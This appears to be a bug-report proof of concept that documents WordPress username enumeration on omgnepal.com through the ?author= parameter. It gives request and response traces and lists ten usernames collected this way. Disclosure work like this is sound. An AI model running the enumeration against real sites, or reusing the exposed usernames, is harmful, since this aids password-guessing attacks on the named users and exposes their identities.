# Proof of Concept — WordPress Username Enumeration via Author ID Parameter

**Target:** omgnepal.com
**Type:** Username Enumeration (CWE-200)
**Tested on:** March 2026

---

## Environment

- Tool: Browser / curl
- OS: Arch Linux
- Authenticated: No

---

## Steps

1. Send a GET request to `https://omgnepal.com/?author=1` with no authentication.
2. Observe the server responds with a `301 Moved Permanently` redirect to `https://omgnepal.com/author/<username>/`.
3. The username is now exposed in the redirect URL.
4. Increment the `author` ID and repeat to enumerate additional users.

---

## HTTP Trace

**Request:**
```
GET /?author=1 HTTP/1.1
Host: omgnepal.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
Accept: text/html
Connection: close
```

**Response:**
```
HTTP/1.1 301 Moved Permanently
Location: https://omgnepal.com/author/nareshlamgade/
```

**Follow redirect:**
```
GET /author/nareshlamgade/ HTTP/1.1
Host: omgnepal.com

HTTP/1.1 200 OK
Content-Type: text/html
```

Response body contains the full author profile page with username `nareshlamgade` exposed.

---

## Full Enumeration Results

```
?author=1  → /author/nareshlamgade/
?author=4  → /author/aditya/
?author=7  → /author/drojee/
?author=8  → /author/prajita/
?author=10 → /author/rashmi/
?author=12 → /author/diwas/
?author=14 → /author/ashishrana/
?author=15 → /author/vineet/
?author=16 → /author/subeksya/
?author=17 → /author/gunjan/
```

---

## Behavior

**Expected:** The server should not expose internal usernames via URL redirects. Requests to `?author=` should return a 404 or redirect to the homepage without revealing the username slug.

**Actual:** The server redirects to `/author/<username>/`, directly exposing the WordPress login username of every registered user on the site.
